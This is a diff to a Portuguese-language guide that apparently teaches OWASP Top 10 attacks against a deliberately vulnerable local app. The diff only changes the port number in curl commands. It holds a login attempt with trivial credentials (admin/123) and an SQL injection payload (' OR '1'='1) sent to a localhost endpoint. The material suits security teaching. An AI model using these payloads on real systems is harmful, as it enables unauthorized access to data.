@@ -43,7 +43,7 @@ npm run secure
 ### Passo 1 — A07: Login com senha trivial
 ```bash
 $body = '{\"username\":\"admin\",\"password\":\"123\"}'
-curl.exe -X POST http://localhost:3001/login -H "Content-Type: application/json" -d $body
+curl.exe -X POST http://localhost:3000/login -H "Content-Type: application/json" -d $body
 ```
 
 ### Passo 2 — A01: IDOR (acessar dados de outro usuário)
@@ -63,7 +63,7 @@ curl.exe -X GET "http://localhost:3000/admin/users" -H "Authorization: Bearer $t
 ### Passo 4 — A05: SQL Injection
 ```bash
 $token = "SEU_TOKEN_AQUI"
-curl.exe -X GET "http://localhost:3001/pedidos?filter=%27%20OR%20%271%27%3D%271" -H "Authorization: Bearer $token"
+curl.exe -X GET "http://localhost:3000/pedidos?filter=%27%20OR%20%271%27%3D%271" -H "Authorization: Bearer $token"
 # filter decodificado: ' OR '1'='1
 ```
 
